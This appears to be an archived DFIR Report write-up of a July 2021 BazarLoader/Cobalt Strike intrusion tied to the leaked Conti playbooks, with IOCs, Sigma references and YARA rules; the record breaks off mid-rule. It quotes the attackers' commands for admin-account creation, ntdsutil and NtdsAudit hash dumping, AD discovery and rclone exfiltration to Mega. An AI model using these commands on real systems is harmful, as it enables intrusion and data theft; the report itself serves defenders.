{
    "id": "4b836383-fd00-463b-852d-50fd677f6e17",
    "created_at": "2023-01-12T14:58:59.556942Z",
    "updated_at": "2025-03-27T02:13:58.364635Z",
    "deleted_at": null,
    "sha1_hash": "caeaf80826ff5696f2bb643dd963bb3dd50afdc8",
    "title": "2021-10-04 - BazarLoader and the Conti Leaks",
    "authors": "",
    "file_creation_date": "2022-05-28T18:04:23Z",
    "file_modification_date": "2022-05-28T18:04:23Z",
    "file_size": 2183339,
    "plain_text": "# BazarLoader and the Conti Leaks\n\n**[thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/](https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/)**\n\n## Intro\n\n\nOctober 4, 2021\n\n\n### In July, we observed an intrusion that started from a BazarLoader infection and lasted approximately three days. The threat actor’s main priority was to map the domain network, while looking for interesting data to exfiltrate. Their preferred method of operation was through GUI applications such as RDP and AnyDesk.\n\n Historically, BazarLoader was used to deploy Ryuk, as we reported on many occasions. In one of our latest reports, we saw BazarLoader result in the deployment of Conti ransomware.\n\n## Case Summary\n\n### In this case, we did not see the exact initial access vector but based on other reports at the time we assess with medium to high confidence a malicious email campaign delivering macro enabled Word documents was the delivery vector. Shortly after the initial BazarLoader execution, we observed the first discovery commands using the standard built in Microsoft utilities (net view, net group, nltest). We saw the BazarLoader process download and execute the first Cobalt Strike beacon twenty minutes later using rundll32.\n\n As the operators tried to enumerate the network, they miss-typed a lot of their commands. During interactive discovery tasks via the Cobalt Strike beacon, the threat actors attempted an unusual command that had us scratching our heads for awhile, “av_query”. This left us confused, we were not aware of the reason and/or the purpose of this command.\n\n\n-----\n\n### On August 5th, a threat actor that goes with the name m1Geelka, leaked multiple documents that contained instructions, tools and, “training” materials to be used by affiliates of Conti ransomware. We demonstrated some of the documents on one of our recent tweet threads, more info about the Conti leak here. In these materials, we found a file called “AVquery.cna” that refers to a Cobalt Strike aggressor script for identifying AV on the target systems. It is likely that the threat actors in this intrusion meant to use this aggressor script via their Cobalt Strike console, but instead typed or pasted “av_query” into their windows command prompt session. Additionally, threat actors were seen following the instructions of the leaked documents step by step. More specifically, we observed the threat actors copy/pasting the exact commands such as creating local admin users that contained the same passwords we saw in the leaked instructions.\n\n Continuing with the discovery phase, the threat actors executed AdFind via a batch script before further enumerating using native Windows tools and port scanning via the Cobalt Strike beacon. They then successfully escalated privileges by dumping credentials from the LSASS process. After having enough situational awareness over the domain and an administrator’s account in their possession, operators used a reverse proxy and established a RDP connection on the beachhead host. Moments later, we observed them move laterally for the first time to the Domain Controller using RDP. Once on the Domain Controller, they again downloaded and executed AdFind through the same batch script. They also ran two separate Cobalt Strike beacons. As if their presence was not enough with Cobalt Strike and administrator credentials, they proceeded with creating two local administrator accounts.\n\n Next, they installed AnyDesk, a remote access application for RDP connectivity and remote system control. After having four different types of persistence, they felt it was enough and continued enumerating the network, only this time, they searched for valuable documents across all domain-joined hosts. To accomplish that, they used PowerSploit and, more specifically, the “Invoke-ShareFinder” module. While waiting for their script to finish, the threat actors created a full backup of active directory in “IFM” media mode and dumped the password hashes along with the corresponding users. This method is both stealthier and safer for extracting the hashes from active directory, as explained by Black Hills Information Security.\n\n The next step for the threat actors was to download and run “Advanced IP Scanner” and scanned for ranges looking for other active subnets on the LAN. After four hours of downtime, the operators returned to the network and did something unexpected; they used seatbelt to enumerate the domain controller further. They then pivoted over to another domain controller, repeated all the above discovery steps, and ran the same tools as on the first domain controller.\n\n Eventually, this intrusion ended on the third day from the initial BazarLoader execution. After almost a day of inactivity, the operators logged into the network and used RDP to remote into file servers that contained valuable data. They then created a directory called Shares$ and\n\n\n-----\n\n### used Rclone to exfiltrate the data to the Mega Fileshare service. Typically, these types of cases end up with Conti ransomware, however, the threat actors were evicted from the network before a final suspected ransomware deployment commenced.\n\n## Services\n\n### We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc. More information on this service and others can be found here.\n\n Three of the Cobalt Strike servers from this case were added to the Threat Feed on 7/19 and the other two were added on 7/29.\n\n We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n\n-----\n\n-----\n\n### Analysis and reporting completed by @kostastsale\n\n Reviewed by @iiamaleks and @pigerlin\n\n## MITRE ATT&CK\n\n Initial Access\n\n### We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.\n\n Brad reported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.\n\n\n-----\n\n## Execution\n\n### The initial execution for this intrusion took place with the use of BazarLoader malware via rundll32.\n\n\n-----\n\n### Immediately after the execution, the malware contacted two of its C2 IPs:\n```\n35.165.197.209|443 \n3.101.57.185|443\n\n We then observed the threat actor using the BazarLoader injected process, svchost.exe, to download Cobalt Strike and save it under:\nC:\\Users\\<user>\\Appdata\\Local\\Temp\n\n before executing it using rundll32.exe.\n\n```\n\n-----\n\n### Throughout the intrusion, the threat actors utilized Cobalt Strike beacons and PowerShell to execute their payloads prior to interactively remoting into hosts using RDP and AnyDesk.\n\n## Persistence\n\n### The threat actors created two local user accounts on the first Domain Controller. They also added one of the two to the local administrators group. The passwords that they used were the same as the passwords of the recent Conti leaked documents.\n\n Screenshot from leaked Conti data (“Закреп\\ AnyDesk.txt”) (our tweet thread on Conti leak manuals):\n\n Commands from the intrusion:\n```\nnet user sqlbackup qc69t4b#z0ke3 /add \nnet user localadmin qc69t4b#z0ke3 /add \nnet localgroup administrators localadmin /add \n\n AnyDesk was also installed on the main domain controller.\n\n The threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.\n\n The threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk. Client ID 776934005. (ad_svc.trace)\n\n## Privilege Escalation\n\n```\n\n-----\n\n### The threat actors accessed credentials for an administrator account from the LSASS process using the Cobalt Strike beacon. On the image below, we can see that the CS beacon process is injected into LSASS.\n\n## Defense Evasion\n\n### Throughout the intrusion, we observed multiple instances of process injection from both the initial BazarLoader malware and Cobalt Strike beacons.\n\n After BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process. Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.\n\n## Credential Access\n\n### The LSASS process was accessed by an unusual process “searchindexer.exe” on beachhead right before the lateral movement was observed. Searchindexer.exe is a legitimate Windows process responsible for the indexing of files or Windows searches.\n\n This technique is known to be used by Cobaltstrike which inject malicious code into a newly spawned searchindexer process to evade detection. This is associated with MITRE ATT&CK (r) Tactic(s): Defense Evasion and Technique(s): T1036.004.\n\n\n-----\n\n### The Sysmon logs captured in our case below can be used to detect this type of activity.\n```\nSysmon Event ID: 10 \nDescription: Process Access \nSourceImage: C:\\Winows\\System32\\SearchIndexer.exe \nTargetImage: C:\\Windows\\system32\\lsass.exe \nSourceImage: C:\\Winows\\System32\\SearchIndexer.exe \nTargetImage: C:\\Windows\\system32\\lsass.exe \nGrantedAccess: 0x21410 \nCallTrace:\nC:\\Windows\\SYSTEM32\\ntdll.dll+9d2e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcee|C:\\Progra\n Files\\Common Files\\Microsoft Shared\\Ink\\IpsPlugin.dll+10369|C:\\Program Files\\Common\nFiles\\Microsoft Shared\\Ink\\IpsPlugin.dll+10b65|C:\\Program Files\\Common\nFiles\\Microsoft Shared\\Ink\\IpsPlugin.dll+8cb2 \n\n The threat actors created a full backup of the active directory in “IFM” media mode and dumped the password hashes along with the corresponding users.\nntdsutil \"ac in ntds\" \"ifm\" \"create full c:\\windows\\temp\\crashpad\\x\" q q \n\n They also employed the NtdsAudit tool immediately after using NTDSutil to dump the password hashes of all domain users. NtdsAudit requires the “ntds.dit” database file and SYSTEM registry file for extracting the password hashes and usernames. After providing these as arguments, they exported the password hashes in a file that they named “pwdump.txt” and the user details in a csv file called “users.csv”. After obtaining the password hashes, the threat actors can crack the passwords hashes using a program such as hashcat.\nntdsAudit.exe ntds.dit -s SYSTEM -p pwddump.txt -u users.csv\n\n## Discovery\n\n### A few minutes after the initial execution, BazarLoader ran some discovery tasks using the built in Microsoft net and nltest utilities and transferred the results over the C2 channel.\nnet view /all \nnet view /all /domain \nnltest /domain_trusts /all_trusts \nnet localgroup \"administrator\" (comment: command mistyped) \nnet group \"domain admins\" /dom \n\n Later on, hands-on operators carried out some additional network and domain reconnaissance from the Cobalt Strike beacon. Again, built in utilities were favored, with the exception of what we assess was a fat finger or miss-paste by the threat actor entering a command they meant to execute in their Cobalt Strike console into the windows command terminal.\n\n```\n\n-----\n\n```\nipconfig /all \nnltest /dclist \nnet group \"Domain Admins\" /dom \ntasklist \nav_query (comment: Not a valid command) \nnet localgroup Administrateurs (comment: French translation of the named group\nadministrators) \nnet localgroup Administrators \nSYSTEMINFO\n\n### The threat actors executed AdFind multiple times on both the beachhead and the domain controllers through a well-known script called adf.bat.\nadfind.exe -f \"(objectcategory=person)\" \nadfind.exe -f \"objectcategory=computer\" \nadfind.exe -f \"(objectcategory=organizationalunit)\" \nadfind.exe -sc trustdmp \nadfind.exe -subnets -f (objectcategory=subnet) \nadfind.exe -f \"(objectcategory=group)\" \nadfind.exe -gcb -sc trustdmp \n\n Later on, during the first day of the intrusion, and before we saw the threat actors pivot laterally to the domain controller, they ensured the information that they had collected was accurate by running the below enumeration commands:\nnet use \nipconfig /all \nnetstat -ano \nnet group \"domain admins\" /domain \nnet view \"Domain Controller name\" \nnet view \"Second Domain Controller name\"\nping \"Domain Controller IP\"\nping \"Domain Controller name\"\nping \"Second Domain Controller name\"\nping \"Domain Controller IPv6\"\necho %%username%% \narp -a \ntime \ndate\n\n```\n\n-----\n\n### Threat actor dropped and ran a script named ping.bat. Here s an example:\n```\nping -n 1 hostname >> C:\\programdata\\log.txt\nping -n 1 hostname2 >> C:\\programdata\\log.txt\nping -n 1 hostname3 >> C:\\programdata\\log.txt\n\n The threat actors utilized Advanced IP Scanner to the scan for open ports.\n\n One of the first things that the attackers did once on the first domain controller, was to execute Invoke-ShareFinder from PowerSploit via PowerShell ISE. They did the same thing later, on the second domain controller.\n\"Command\": \"Get-NetCurrentUser\" \n\"Command\": \"Get-NetDomain\" \n\"Command\": \"Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii\nC:\\ProgramData\\shares.txt\"\n\n Other Microsoft AD management PowerShell administration modules were also invoked by the threat actors for discovery tasks.\nGet-ADDomainController\nGet-ADDomainController -Filter * | ft\nGet-ADComputer -Filter * -Properties * | Get-Member\nGet-ADDomain\n\n From the Domain Controller the threat actor also ran a Seatbelt binary, which was also seen in the Conti leak documents. This utility contains a number of “safety checks” on a host, telling the user about things like installed AV, network drives, local users, and much more.\n\n```\n\n-----\n\n### We also noticed the threat actors searching for any existing antivirus software on the domain controller. They ran “dir” on the “c:\\Program Files\\” folder and saved the findings in the AV.txt file using a script named av.bat The script looked similar to the below:\n```\ndir \"\\\\hostname\\c$\\Program Files\\* >> C:\\programdata\\AV.txt\ndir \"\\\\hostname2\\c$\\Program Files\\* >> C:\\programdata\\AV.txt\ndir \"\\\\hostname3\\c$\\Program Files\\* >> C:\\programdata\\AV.txt\n\n## Lateral Movement\n\n### Many hours after the initial compromise, we observed the threat actors using RDP to connect to the first domain controller. They used reverse proxy via the Cobalt Strike C2 to initiate the RDP connection and for that reason, the operator’s real hostname was captured in event ID 4624:\n\n```\n\n-----\n\n## Collection\n\n### Prior to exfiltrating the data, operators staged them under a directory called “Shares” on each file server. They then inspected the documents they collected prior to exfiltrating them over to Mega storage servers using the Rclone application.\n\n## Command and Control\n\n### BazarLoader initial communication with the C2 is over HTTPS. Data is sent to the C2 via the cookie parameter(screenshot taken from https://tria.ge/210716-v4jh8hf6ea/behavioral2).\n\n\n-----\n\n### Twenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.\n\n The AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.\n\n AnyDesk:\n```\n143.244.61.217:443\nJA3: c91bde19008eefabce276152ccd51457\nJA3s: 107030a763c7224285717ff1569a17f3\nCertificate: [18:42:fd:a1:39:29:33:47:44:65:bc:a2:d6:73:a8:c5:c9:35:9a:f3 ]\nNot Before: 2014/04/11 02:37:55 UTC \nNot After: 2024/04/08 02:37:55 UTC \nIssuer Org: philandro Software GmbH \nSubject Common: anynet root ca \nSubject Org: philandro Software GmbH \nPublic Algorithm: rsaEncryption \nCertificate: [9e:08:d2:58:a9:02:cd:4f:e2:4a:26:b8:48:5c:43:0b:81:29:99:e3 ]\nNot Before: 2018/11/18 02:14:23 UTC \nNot After: 2028/11/15 02:14:23 UTC \nIssuer Org: philandro Software GmbH \nSubject Common: anynet relay \nSubject Org: philandro Software GmbH \nPublic Algorithm: id-ecPublicKey Curveprime256v1\n\n Some network oddities appeared several times during the course of the intrusion. One of those oddities was several connections across the intrusion to an XMPP chat server at chatterboxtown.us at 70.35.205.161. These connections originated from one of the Cobalt\n\n```\n\n-----\n\n### Strike processes over port 5222. The goal of this traffic was not discovered in the course of the investigation.\n\n Another, was a brief SSH connection to a server on the internet using Putty.\n\n\n-----\n\n### The connection took place for a period of twenty minutes. The reason for this connection is unknown. According to public records, the IP is associated with an old Cobalt Strike C2 server.\n\n\n-----\n\n### BazarLoader:\n```\n35.165.197.209:443\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: e35df3e00ca4ef31d42b34bebaa2f86e\nCertificate: [df:f6:ef:75:f8:f5:c8:8c:1a:4b:49:fd:29:99:d8:58:d0:9c:17:b0 ]\nNot Before: 2021/07/13 11:58:09 UTC \nNot After: 2022/07/13 11:58:09 UTC \nIssuer Org: NN Fern \nSubject Common: forenzik.kz \nSubject Org: NN Fern \nPublic Algorithm: rsaEncryption\n3.101.57.185:443\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: e35df3e00ca4ef31d42b34bebaa2f86e\nCertificate: [71:9c:ce:11:b3:f0:ea:6f:1e:0f:ff:0f:b4:34:ec:bb:6c:aa:35:40 ]\nNot Before: 2021/07/13 11:58:21 UTC \nNot After: 2022/07/13 11:58:21 UTC \nIssuer Org: NN Fern Subject \nCommon: forenzik.kz \nSubject Org: NN Fern \nPublic Algorithm: rsaEncryption\n54.177.153.230:443\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: e35df3e00ca4ef31d42b34bebaa2f86e\nCertificate: [a1:ab:fe:d6:e4:5a:23:14:dd:8b:67:54:1d:8e:85:b1:c6:10:4a:3f ]\nNot Before: 2021/07/13 11:58:22 UTC \nNot After: 2022/07/13 11:58:22 UTC \nIssuer Org: NN Fern \nSubject Common: forenzik.kz \nSubject Org: NN Fern \nPublic Algorithm: rsaEncryption\n\n Cobalt Strike:\n\n yawero.com (45.153.240.234:443) This Cobalt Strike server was added to our Threat Feed on 07/19/2021.\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [f7:1b:37:3f:2c:0e:c4:3f:dd:3a:f5:dd:ad:39:54:b2:db:b4:c7:f3 ]\nNot Before: 2021/06/02 00:00:00 UTC \nNot After: 2022/06/02 23:59:59 UTC \nIssuer Org: Sectigo Limited \nSubject Common: sazoya.com [sazoya.com,www.sazoya.com ]\nPublic Algorithm: rsaEncryption\n\n sazoya.com (23.106.160.77:443) This Cobalt Strike server was added to our Threat Feed on 07/29/2021.\n\n```\n\n-----\n\n```\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [f7:1b:37:3f:2c:0e:c4:3f:dd:3a:f5:dd:ad:39:54:b2:db:b4:c7:f3 ]\nNot Before: 2021/06/02 00:00:00 UTC \nNot After: 2022/06/02 23:59:59 UTC \nIssuer Org: Sectigo Limited \nSubject Common: sazoya.com [sazoya.com,www.sazoya.com ]\nPublic Algorithm: rsaEncryption\n\n### sazoya.com (192.198.86.130:443) This Cobalt Strike server was added to our Threat Feed on 07/29/2021. The IP appeared previously tied to a different domain on 05/11/2021.\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [f7:1b:37:3f:2c:0e:c4:3f:dd:3a:f5:dd:ad:39:54:b2:db:b4:c7:f3 ]\nNot Before: 2021/06/02 00:00:00 UTC \nNot After: 2022/06/02 23:59:59 UTC \nIssuer Org: Sectigo Limited \nSubject Common: sazoya.com [sazoya.com,www.sazoya.com ]\nPublic Algorithm: rsaEncryption\n\n```\n\n-----\n\n```\n{\n  \"x64\": { \n    \"md5\": \"9ea3a4b4bf64aeaefb60ada634f7fb43\", \n    \"sha1\": \"3e12312e43f4b84129023057862ee3934ca24c6d\", \n    \"time\": 1627455897000.6, \n    \"sha256\": \"43ecc44566a599a1f5d5b5063f27fd18b34e0dc67e053570e9ad944ad3f16024\",\n    \"config\": { \n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \n      \"HTTP Method Path 2\": \"/ro\", \n      \"Jitter\": 14, \n      \"C2 Server\":\n\"yawero.com,/skin.js,sazoya.com,/skin.js,192.198.86.130,/skin.js\", \n      \"Method 1\": \"GET\", \n      \"Port\": 443, \n      \"Method 2\": \"POST\", \n      \"Polling\": 5000, \n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \n      \"Watermark\": 1580103814, \n      \"Beacon Type\": \"8 (HTTPS)\", \n      \"C2 Host Header\": \"\" \n    }, \n    \"uri_queried\": \"/IMXo\" \n  }, \n  \"x86\": { \n    \"md5\": \"d2bb4366b7018e0ed3e7f752fc312371\", \n    \"sha1\": \"0dfc5ef1947a29227d994a44f33c1b0fe12598ea\", \n    \"time\": 1627455891592.5, \n    \"sha256\": \"01b164f74bde4eb7c7da8c6cd707f23ce1923da49a3deb36aea5cd6e3030c0d6\",\n    \"config\": { \n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \n      \"HTTP Method Path 2\": \"/groupcp\", \n      \"Jitter\": 14, \n      \"C2 Server\":\n\"yawero.com,/skin.js,sazoya.com,/skin.js,192.198.86.130,/skin.js”,v \n      \"Method 1\": \"GET\", \n      \"Port\": 443, \n      \"Method 2\": \"POST\", \n      \"Polling\": 5000, \n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \n      \"Watermark\": 1580103814, \n      \"Beacon Type\": \"8 (HTTPS)\", \n      \"C2 Host Header\": \"\" \n    }, \n    \"uri_queried\": \"/PJkW\" \n  } \n}\n\n### Cobalt Strike:\n\n gojihu.com (23.106.215.61:443) This Cobalt Strike server was added to our Threat Feed on 07/19/2021.\n\n```\n\n-----\n\n```\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [1f:1c:7a:7d:0c:9d:cd:dd:47:2f:a9:e5:ac:c8:ae:da:70:29:02:81 ]\nNot Before: 2021/07/04 00:00:00 UTC \nNot After: 2022/07/04 23:59:59 UTC \nIssuer Org: Sectigo Limited \nSubject Common: yuxicu.com [yuxicu.com,www.yuxicu.com ]\nPublic Algorithm: rsaEncryption \n\n### yuxicu.com (23.82.19.173:443) This Cobalt Strike server was added to our Threat Feed on 07/19/2021.\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [1f:1c:7a:7d:0c:9d:cd:dd:47:2f:a9:e5:ac:c8:ae:da:70:29:02:81 ]\nNot Before: 2021/07/04 00:00:00 UTC \nNot After: 2022/07/04 23:59:59 UTC \nIssuer Org: Sectigo Limited \nSubject Common: yuxicu.com [yuxicu.com,www.yuxicu.com ]\nPublic Algorithm: rsaEncryption \n\n```\n\n-----\n\n```\n{\n  \"x86\": { \n    \"uri_queried\": \"/HjIa\", \n    \"md5\": \"742844254840eff409535494ae3ec338\", \n    \"config\": { \n      \"Beacon Type\": \"8 (HTTPS)\", \n      \"C2 Host Header\": \"\", \n      \"C2 Server\": \"gojihu.com,/fam_cart.js,yuxicu.com,/fam_cart.js\", \n      \"HTTP Method Path 2\": \"/case\", \n      \"Port\": 443, \n      \"Method 1\": \"GET\", \n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\mstsc.exe\", \n      \"Method 2\": \"POST\", \n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\", \n      \"Polling\": 5000, \n      \"Jitter\": 32, \n      \"Watermark\": 1580103814 \n    }, \n    \"sha256\": \"8c7e32178cf437f4fd3d7f706066831fce2cd9bc7e2050a3cefebab05952266d\",\n    \"time\": 1627787111212.2, \n    \"sha1\": \"46f33bb1c629cedb52fc5d7e46525ac5ccb13aaa\" \n  }, \n  \"x64\": { \n    \"uri_queried\": \"/4Ovd\", \n    \"md5\": \"1e788b5d1ff62688cfe5d2ef7832712a\", \n    \"config\": { \n      \"Beacon Type\": \"8 (HTTPS)\", \n      \"C2 Host Header\": \"\", \n      \"C2 Server\": \"gojihu.com,/fam_cart.js,yuxicu.com,/fam_cart.js\", \n      \"HTTP Method Path 2\": \"/case\", \n      \"Port\": 443, \n      \"Method 1\": \"GET\", \n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\mstsc.exe\", \n      \"Method 2\": \"POST\", \n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\", \n      \"Polling\": 5000, \n      \"Jitter\": 32, \n      \"Watermark\": 1580103814 \n    }, \n    \"sha256\": \"43ac1418825ccbe33ae34c64fd036f23ef066073e4fefa2a410b53922cfc815f\",\n    \"time\": 1627787113671.1, \n    \"sha1\": \"d4d88b60150088041fec4951335128031441bc5a\" \n  } \n}\n\n## Exfiltration\n\n### As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.\n\n The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application. The destination of the exfiltrated data was Mega.io.\n\n```\n\n-----\n\n### The above command was copied and pasted by the threat actors to exfiltrate the data. Prior to the correct command, the threat actors accidentally pasted a command from a previous intrusion. That command contained a different victim organization in the arguments showing through out the intrusion continued sloppiness of the threat actor.\n```\nrclone.exe copy--max-age 3y \"\\\\<redacted>\\C$\\Shares\" remote: <redacted>\\<redacted> -bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers\n12 -P \n\n Breaking down the Rclone command line arguments:\n- copy: Copy the source to the destination \n- --max-age: Only transfer files younger than <time> \n- \\\\<redacted>\\C$\\Shares\": From source \n- remote: <redacted>\\<redacted>: To destination folder \n- Bwlimit 2M: Bandwidth limit \n- -q: quiet \n- --ignore-existing: Skip all files that exist on destination \n- --auto-confirm: Do not request console confirmation \n- --multi-thread-streams: Max number of streams to use for multi-thread downloads \n- --transfers: Number of file transfers to run in parallel \n- -P: Show progress\n\n Reference:\nhttps://rclone.org/flags/ \nhttps://rclone.org/commands/rclone_copy/\n\n A great reference for detecting Rclone data exfiltration is the article from nccgroup: Detecting Rclone – An Effective Tool for Exfiltration – and from Red Canary – Transferring Leverage in a Ransomware Attack.\n\n## Impact\n\n### Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network. BazarLoader infections currently tend to materialize into Conti ransomware, and many of the TTP’s of the infection mimic the instructions from the leaked Conti manual.\n\n Information posted from @AltShiftPrtScn based on an IR engagement where the threat actors already had domain admin on the network two months prior meeting their final objectives.\n\n```\n\n-----\n\n## IOCs\n\nNetwork\n```\n45.153.240.234|443\nyawero.com\n23.106.160.77|443\nsazoya.com\n192.198.86.130|443\n23.106.215.61|443\ngojihu.com\n23.82.19.173:443\nyuxicu.com\n35.165.197.209|443\n3.101.57.185|443\n54.177.153.230|443\n\n```\nFile\n\n\n-----\n\n```\n21.dll\nd6b773f8b88be82d4de015edbf0cc2fa\n7461eb3051102c76004cd58e55560044d3789d5c\n96a74d4c951d3de30dbdaadceee0956682a37fcbbc7005d2e3bbd270fbd17c98\n21.exe\n362812fdbc2dc2c5a2b214f223f12096\n2c4c4926b3b931d4628425b309a3357c63634fc9\n972e38f7fa4c3c59634155debb6fb32eebda3c0e8e73f4cb264463708d378c39\n37B.dll\nd6b773f8b88be82d4de015edbf0cc2fa\n7461eb3051102c76004cd58e55560044d3789d5c\n96a74d4c951d3de30dbdaadceee0956682a37fcbbc7005d2e3bbd270fbd17c98\nadf.bat\n7645b80c8627b0ba13ebc20491c82792\n05c43272a1d244413d0ef8595518b9c7601d3968\n218e8dc823e27a3baf3dcf48831562d488c2fa2c205286ea9af8a718b246b4cb\nNtdsAudit.exe\n1fd930064b81e7c96eedb985ca2a0d97\n39f7e3f5435cdfacaa89aa5ef2d4e092bde4494e\nfb49dce92f9a028a1da3045f705a574f3c1997fe947e2c69699b17f07e5a552b\nea3612919bf05b66e9a608bee742a422.dll\nea3612919bf05b66e9a608bee742a422\nfd001fb71e9faa68c6e53162ed0554fd6f16a0e381aa280cea397b3d74bb62eb\n\n## Detections\n\n```\nNetwork\n```\nET TROJAN Observed Malicious SSL Cert (BazaLoader CnC) \nET MALWARE Observed Malicious SSL Cert (Bazar Backdoor) \nET POLICY IP Check Domain (myexternalip .com in TLS SNI) \nET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) \nET USER_AGENTS AnyDesk Remote Desktop Software User-Agent \nET POLICY HTTP POST to MEGA Userstorage\n\n```\nSigma\n\n### Detects execution of Net.exe, whether suspicious or benign – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_n et_execution.yml\n\n Suspicious AdFind Execution – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_a dfind.yml\n\n AD Privileged Users or Groups Reconnaissance – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_account_discovery .yml\n\n Dridex Process Pattern – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_malwar e_dridex.yml\n\n\n-----\n\n### Domain Trust Discovery – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_trust_di scovery.yml\n\n Invocation of Active Directory Diagnostic Tool (ntdsutil.exe) – https://github.com/NVISOsecurity/sigma- public/blob/master/rules/windows/process_creation/win_susp_ntdsutil.yml\n\n Advanced IP Scanner – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_advanc ed_ip_scanner.yml\n\n Local Accounts Discovery – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_local_s ystem_owner_account_discovery.yml\n\n Net.exe User Account Creation – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_net_us er_add.yml\n\n Rundll32 Internet Connection – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/network_connection/sysmon_rundll32_net_connections.yml\n\n Malicious PowerShell Commandlets – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_malici ous_commandlets.yml\n\n Suspicious Svchost Process – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_s vchost.yml\n\n Rclone Execution via Command Line or PowerShell – https://gist.github.com/beardofbinary/fede0607e830aa1add8deda3d59d9a77#file- rclone_execution-yaml\n\n DNS Query for MEGA.io Upload Domain – https://gist.github.com/beardofbinary/d46c3b4e37ba8b21a79a63fbf69c6411#file- mega_dns_lookup-yaml\n\nYara\n\n\n-----\n\n```\nrule informational_AnyDesk_Remote_Software_Utility { \n  meta: \n   description = \"files - AnyDesk.exe\" \n   author = \"TheDFIRReport\" \n   date = \"2021-07-25\" \n   hash1 = \"9eab01396985ac8f5e09b74b527279a972471f4b97b94e0a76d7563cf27f4d57\" \n  strings: \n   $x1 = \"C:\\\\Buildbot\\\\ad-windows-32\\\\build\\\\release\\\\app32\\\\win_loader\\\\AnyDesk.pdb\" fullword ascii \n   $s2 = \"release/win_6.3.x\" fullword ascii \n   $s3 = \"16eb5134181c482824cd5814c0efd636\" fullword ascii \n   $s4 = \"b1bfe2231dfa1fa4a46a50b4a6c67df34019e68a\" fullword ascii \n   $s5 = \"Z72.irZ\" fullword ascii \n   $s6 = \"ysN.JTf\" fullword ascii \n   $s7 = \",;@O:\\\"\" fullword ascii \n   $s8 = \"ekX.cFm\" fullword ascii \n   $s9 = \":keftP\" fullword ascii \n   $s10 = \">FGirc\" fullword ascii \n   $s11 = \">-9 -D\" fullword ascii \n   $s12 = \"% /m_v?\" fullword ascii \n   $s13 = \"?\\\\+ X5\" fullword ascii \n   $s14 = \"Cyurvf7\" fullword ascii \n   $s15 = \"~%f_%Cfcs\" fullword ascii \n   $s16 = \"wV^X(P+ \" fullword ascii \n   $s17 = \"\\\\Ej0drBTC8E=oF\" fullword ascii \n   $s18 = \"W00O~AK_=\" fullword ascii \n   $s19 = \"D( -m}w\" fullword ascii \n   $s20 = \"avAoInJ1\" fullword ascii \n  condition: \n   uint16(0) == 0x5a4d and filesize < 11000KB and \n   1 of ($x*) and 4 of them \n}\nrule cobalt_strike_dll21_5426 { \n  meta: \n   description = \"files - 21.dll\" \n   author = \"TheDFIRReport\" \n   date = \"2021-07-25\" \n   hash1 = \"96a74d4c951d3de30dbdaadceee0956682a37fcbbc7005d2e3bbd270fbd17c98\" \n  strings: \n   $s1 = \"AWAVAUATVWUSH\" fullword ascii \n   $s2 = \"UAWAVVWSPH\" fullword ascii \n   $s3 = \"AWAVAUATVWUSPE\" fullword ascii \n   $s4 = \"UAWAVATVWSH\" fullword ascii \n   $s5 = \"AWAVVWUSH\" fullword ascii \n   $s6 = \"UAWAVAUATVWSH\" fullword ascii \n   $s7 = 